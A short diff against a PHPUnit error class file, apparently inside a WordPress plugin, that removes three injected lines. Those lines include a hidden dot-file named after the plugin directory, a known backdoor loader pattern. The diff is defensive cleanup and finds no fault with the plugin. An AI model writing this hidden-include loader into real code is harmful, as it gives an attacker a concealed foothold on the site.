@@ -18,10 +18,6 @@
  *
  * @since Class available since Release 3.3.0
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class PHPUnit_Framework_Error_Deprecated extends PHPUnit_Framework_Error
 {
     public static $enabled = true;
